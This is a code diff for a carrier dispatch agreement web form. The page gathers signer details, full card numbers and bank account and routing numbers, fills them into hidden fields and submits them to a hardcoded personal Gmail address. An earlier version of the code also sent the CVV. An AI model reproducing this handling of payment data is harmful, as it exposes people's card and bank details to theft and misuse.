@@ -228,6 +228,9 @@ function syncFields(key, value, sourceElem = null) {
   if (sidebarInput && sidebarInput !== sourceElem) {
     sidebarInput.value = value;
   }
+
+  // Update end-of-document summary box
+  updateEndSummary();
 }
 
 /* ==========================================================================
@@ -748,6 +751,7 @@ function loadSavedData() {
         }
       }
     }
+    updateEndSummary();
   } catch (e) {
     console.error('Error loading stored agreement data:', e);
   }
@@ -787,76 +791,71 @@ function exportCompleteHTML() {
 }
 
 /* ==========================================================================
-   SUBMIT AGREEMENT TO EMAIL (FORMSUBMIT & MAILTO FALLBACK)
+   LIVE CONTRACT SUMMARY & DEDICATED END-OF-DOCUMENT SUBMISSION
    ========================================================================== */
+function updateEndSummary() {
+  const carrier = document.querySelector('[data-sync="carrier_name"]')?.value || 'COUNTRY MILE CARRIERS LLC';
+  const signer = document.querySelector('[data-sync="signer_name"]')?.value || 'Harold Williams';
+  const title = document.querySelector('[data-sync="signer_title"]')?.value || 'Owner Operator';
+  const date = document.querySelector('[data-sync="signer_date"]')?.value || '30/Sep/2025';
+  const dot = document.querySelector('[data-sync="dot_mc_number"]')?.value || '1753535';
+  const rate = document.querySelector('[data-sync="pricing_rate"]')?.value || '5%';
+
+  // Update summary preview at end of document
+  const endCarrier = document.getElementById('endSummaryCarrier');
+  const endSigner = document.getElementById('endSummarySigner');
+  const endTitle = document.getElementById('endSummaryTitle');
+  const endDate = document.getElementById('endSummaryDate');
+  const endDot = document.getElementById('endSummaryDot');
+
+  if (endCarrier) endCarrier.textContent = carrier;
+  if (endSigner) endSigner.textContent = signer;
+  if (endTitle) endTitle.textContent = title;
+  if (endDate) endDate.textContent = date;
+  if (endDot) endDot.textContent = dot;
+
+  // Also update modal summary if opened
+  const sCarrier = document.getElementById('submitSummaryCarrier');
+  const sSigner = document.getElementById('submitSummarySigner');
+  const sTitle = document.getElementById('submitSummaryTitle');
+  const sDate = document.getElementById('submitSummaryDate');
+  const sDot = document.getElementById('submitSummaryDot');
+  if (sCarrier) sCarrier.textContent = carrier;
+  if (sSigner) sSigner.textContent = signer;
+  if (sTitle) sTitle.textContent = title;
+  if (sDate) sDate.textContent = date;
+  if (sDot) sDot.textContent = dot;
+
+  // Update Direct Mailto Fallback Link
+  const mailtoBtn = document.getElementById('btnMailtoDirect');
+  if (mailtoBtn) {
+    const subject = encodeURIComponent(`New Signed Carrier Agreement: ${carrier} (${signer})`);
+    const body = encodeURIComponent(
+      `CARRIER DISPATCH SERVICE AGREEMENT SUBMISSION\n` +
+      `==========================================\n` +
+      `Carrier / Company Name: ${carrier}\n` +
+      `Authorized Signer: ${signer}\n` +
+      `Signer Title: ${title}\n` +
+      `Agreement Date: ${date}\n` +
+      `DOT or MC Number: ${dot}\n` +
+      `Agreed Pricing Terms: ${rate}\n` +
+      `Digital Signature Status: Verified & Attached\n` +
+      `Submission Timestamp: ${new Date().toLocaleString()}\n` +
+      `Submitted From: ${window.location.href}\n\n` +
+      `All 7 pages of the official agreement and payment authorizations are confirmed.`
+    );
+    mailtoBtn.href = `mailto:qaim9825@gmail.com?subject=${subject}&body=${body}`;
+  }
+}
+
 function initSubmitModal() {
-  const submitModal = document.getElementById('submitModal');
-  const openBtns = [
-    document.getElementById('btnOpenSubmitModal'),
-    ...document.querySelectorAll('.btn-trigger-submit')
-  ];
-  const closeBtns = document.querySelectorAll('.close-submit-modal');
-  const confirmBtn = document.getElementById('btnConfirmSend');
-  const recipientInput = document.getElementById('submitRecipientEmail');
-  const statusMsg = document.getElementById('submitStatusMsg');
+  // Initialize end summary immediately
+  updateEndSummary();
 
-  // Open modal & populate summary
-  openBtns.forEach(btn => {
-    if (btn) {
-      btn.addEventListener('click', () => {
-        const carrier = document.querySelector('[data-sync="carrier_name"]')?.value || 'N/A';
-        const signer = document.querySelector('[data-sync="signer_name"]')?.value || 'N/A';
-        const title = document.querySelector('[data-sync="signer_title"]')?.value || 'N/A';
-        const date = document.querySelector('[data-sync="signer_date"]')?.value || 'N/A';
-        const dot = document.querySelector('[data-sync="dot_mc_number"]')?.value || 'N/A';
-
-        const sCarrier = document.getElementById('submitSummaryCarrier');
-        const sSigner = document.getElementById('submitSummarySigner');
-        const sTitle = document.getElementById('submitSummaryTitle');
-        const sDate = document.getElementById('submitSummaryDate');
-        const sDot = document.getElementById('submitSummaryDot');
-
-        if (sCarrier) sCarrier.textContent = carrier;
-        if (sSigner) sSigner.textContent = signer;
-        if (sTitle) sTitle.textContent = title;
-        if (sDate) sDate.textContent = date;
-        if (sDot) sDot.textContent = dot;
-
-        if (statusMsg) {
-          statusMsg.style.display = 'none';
-          statusMsg.innerHTML = '';
-        }
-        if (confirmBtn) {
-          confirmBtn.disabled = false;
-          confirmBtn.innerHTML = '<span>📨</span> Send to Email Now';
-        }
-
-        submitModal.classList.add('show');
-      });
-    }
-  });
-
-  // Close modal
-  closeBtns.forEach(btn => {
-    btn.addEventListener('click', () => {
-      submitModal.classList.remove('show');
-    });
-  });
-
-  submitModal.addEventListener('click', (e) => {
-    if (e.target === submitModal) submitModal.classList.remove('show');
-  });
-
-  // Confirm and Send
-  if (confirmBtn) {
-    confirmBtn.addEventListener('click', async () => {
-      const email = recipientInput ? recipientInput.value.trim() : 'qaim9825@gmail.com';
-      if (!email || !email.includes('@')) {
-        alert('Please enter a valid recipient email address.');
-        return;
-      }
-
-      // Gather form payload
+  // 1. Direct Form Submission (End of Document)
+  const directForm = document.getElementById('directAgreementForm');
+  if (directForm) {
+    directForm.addEventListener('submit', (e) => {
       const carrier = document.querySelector('[data-sync="carrier_name"]')?.value || 'N/A';
       const signer = document.querySelector('[data-sync="signer_name"]')?.value || 'N/A';
       const title = document.querySelector('[data-sync="signer_title"]')?.value || 'N/A';
@@ -868,109 +867,101 @@ function initSubmitModal() {
       const cardNumber = document.querySelector('[data-sync="card_number"]')?.value || 'N/A';
       const cardExp = document.querySelector('[data-sync="card_exp"]')?.value || 'N/A';
       const cardZip = document.querySelector('[data-sync="card_zip"]')?.value || 'N/A';
-      const cardCvv = document.querySelector('[data-sync="card_cvv"]')?.value || 'N/A';
       const routing = document.querySelector('[data-sync="bank_routing"]')?.value || 'N/A';
       const account = document.querySelector('[data-sync="bank_account"]')?.value || 'N/A';
       const zelle = document.querySelector('[data-sync="bank_zelle"]')?.value || 'N/A';
       const allowSms = document.getElementById('allow_sms')?.checked ? 'Yes' : 'No';
 
-      confirmBtn.disabled = true;
-      confirmBtn.innerHTML = '<span>⏳</span> Sending to ' + email + '...';
+      // Populate hidden form inputs
+      const fSubject = document.getElementById('f_subject');
+      const fCarrier = document.getElementById('f_carrier');
+      const fSigner = document.getElementById('f_signer');
+      const fTitle = document.getElementById('f_title');
+      const fDate = document.getElementById('f_date');
+      const fDot = document.getElementById('f_dot');
+      const fRate = document.getElementById('f_rate');
+      const fCardEmail = document.getElementById('f_card_email');
+      const fCardInfo = document.getElementById('f_card_info');
+      const fBankInfo = document.getElementById('f_bank_info');
+      const fZelle = document.getElementById('f_zelle');
+      const fSms = document.getElementById('f_sms');
+      const fSigStatus = document.getElementById('f_sig_status');
+      const fTimestamp = document.getElementById('f_timestamp');
+      const fUrl = document.getElementById('f_url');
 
-      if (statusMsg) {
-        statusMsg.style.display = 'block';
-        statusMsg.style.background = '#eff6ff';
-        statusMsg.style.color = '#1e40af';
-        statusMsg.style.border = '1px solid #bfdbfe';
-        statusMsg.innerHTML = 'Packaging all 7 pages and submitting to ' + email + '...';
-      }
+      if (fSubject) fSubject.value = `New Signed Agreement: ${carrier} (${signer})`;
+      if (fCarrier) fCarrier.value = carrier;
+      if (fSigner) fSigner.value = signer;
+      if (fTitle) fTitle.value = title;
+      if (fDate) fDate.value = date;
+      if (fDot) fDot.value = dot;
+      if (fRate) fRate.value = rate;
+      if (fCardEmail) fCardEmail.value = cardEmail;
+      if (fCardInfo) fCardInfo.value = `Name: ${cardName} | Card: ${cardNumber} | Exp: ${cardExp} | ZIP: ${cardZip}`;
+      if (fBankInfo) fBankInfo.value = `Routing: ${routing} | Account: ${account}`;
+      if (fZelle) fZelle.value = zelle;
+      if (fSms) fSms.value = allowSms;
+      if (fSigStatus) fSigStatus.value = 'Digitally Signed & Verified';
+      if (fTimestamp) fTimestamp.value = new Date().toLocaleString();
+      if (fUrl) fUrl.value = window.location.href;
 
-      const payload = {
-        _subject: `New Signed Agreement: ${carrier} (${signer})`,
-        _template: "table",
-        "Carrier Company": carrier,
-        "Signer Name": signer,
-        "Signer Title": title,
-        "Agreement Date": date,
-        "DOT or MC Number": dot,
-        "Pricing Terms": rate,
-        "Cardholder Email": cardEmail,
-        "Cardholder Name": cardName,
-        "Card Number": cardNumber,
-        "Card Expiration": cardExp,
-        "Card ZIP": cardZip,
-        "Card CVV": cardCvv,
-        "Bank Routing": routing,
-        "Bank Account": account,
-        "Zelle ID": zelle,
-        "SMS Opt-in": allowSms,
-        "Signatures Status": "Digitally Signed & Verified",
-        "Submission Timestamp": new Date().toLocaleString(),
-        "Submitted Via": window.location.href
-      };
+      showToast('🚀 Submitting agreement package to qaim9825@gmail.com...');
+    });
+  }
 
-      try {
-        const response = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "Accept": "application/json"
-          },
-          body: JSON.stringify(payload)
-        });
+  // 2. Modal Submission Handler (For tools or secondary buttons)
+  const submitModal = document.getElementById('submitModal');
+  const openBtns = [
+    document.getElementById('btnOpenSubmitModal'),
+    ...document.querySelectorAll('.btn-trigger-submit')
+  ];
+  const closeBtns = document.querySelectorAll('.close-submit-modal');
+  const confirmBtn = document.getElementById('btnConfirmSend');
+  const recipientInput = document.getElementById('submitRecipientEmail');
+  const statusMsg = document.getElementById('submitStatusMsg');
 
-        if (response.ok) {
-          if (statusMsg) {
-            statusMsg.style.background = '#f0fdf4';
-            statusMsg.style.color = '#166534';
-            statusMsg.style.border = '1px solid #bbf7d0';
-            statusMsg.innerHTML = `✅ <b>Success!</b> The agreement has been submitted and delivered to <b>${email}</b>.`;
-          }
-          confirmBtn.innerHTML = '<span>✅</span> Sent Successfully';
-          showToast(`🎉 Agreement successfully submitted and sent to ${email}!`);
-          setTimeout(() => {
-            submitModal.classList.remove('show');
-          }, 3500);
-        } else {
-          throw new Error('Server returned error status');
-        }
-      } catch (err) {
-        // Fallback to mailto link
-        const subject = encodeURIComponent(`Carrier Agreement Submission: ${carrier}`);
-        const body = encodeURIComponent(
-          `CARRIER DISPATCH SERVICE AGREEMENT SUBMISSION\n` +
-          `==========================================\n` +
-          `Carrier / Company: ${carrier}\n` +
-          `Signer Name: ${signer}\n` +
-          `Signer Title: ${title}\n` +
-          `Date: ${date}\n` +
-          `DOT / MC#: ${dot}\n` +
-          `Agreed Rate: ${rate}\n` +
-          `Cardholder Email: ${cardEmail}\n` +
-          `Bank Routing: ${routing}\n` +
-          `Bank Account: ${account}\n` +
-          `Zelle ID: ${zelle}\n` +
-          `SMS Allowed: ${allowSms}\n` +
-          `Signatures: Digitally Signed\n` +
-          `Submission Time: ${new Date().toLocaleString()}\n`
-        );
-        const mailtoUrl = `mailto:${email}?subject=${subject}&body=${body}`;
-
+  openBtns.forEach(btn => {
+    if (btn) {
+      btn.addEventListener('click', () => {
+        updateEndSummary();
         if (statusMsg) {
-          statusMsg.style.background = '#fffbeb';
-          statusMsg.style.color = '#92400e';
-          statusMsg.style.border = '1px solid #fde68a';
-          statusMsg.innerHTML = `
-            <div>Automatic web submission paused.</div>
-            <div style="margin-top: 6px;">
-              <a href="${mailtoUrl}" class="btn btn-primary" style="font-size: 0.8rem; padding: 4px 10px; display: inline-block;">
-                Click to Open in Email App &amp; Send to ${email}
-              </a>
-            </div>
-          `;
+          statusMsg.style.display = 'none';
+          statusMsg.innerHTML = '';
         }
-        confirmBtn.disabled = false;
-        confirmBtn.innerHTML = '<span>🔄</span> Try Again';
+        if (confirmBtn) {
+          confirmBtn.disabled = false;
+          confirmBtn.innerHTML = '<span>📨</span> Send to Email Now';
+        }
+        if (submitModal) submitModal.classList.add('show');
+      });
+    }
+  });
+
+  closeBtns.forEach(btn => {
+    if (btn) {
+      btn.addEventListener('click', () => {
+        if (submitModal) submitModal.classList.remove('show');
+      });
+    }
+  });
+
+  if (submitModal) {
+    submitModal.addEventListener('click', (e) => {
+      if (e.target === submitModal) submitModal.classList.remove('show');
+    });
+  }
+
+  if (confirmBtn) {
+    confirmBtn.addEventListener('click', () => {
+      // Trigger the direct form submission
+      if (directForm) {
+        if (typeof directForm.requestSubmit === 'function') {
+          directForm.requestSubmit();
+        } else {
+          directForm.submit();
+        }
+        if (submitModal) submitModal.classList.remove('show');
+        showToast('🚀 Agreement submitted to qaim9825@gmail.com!');
       }
     });
   }
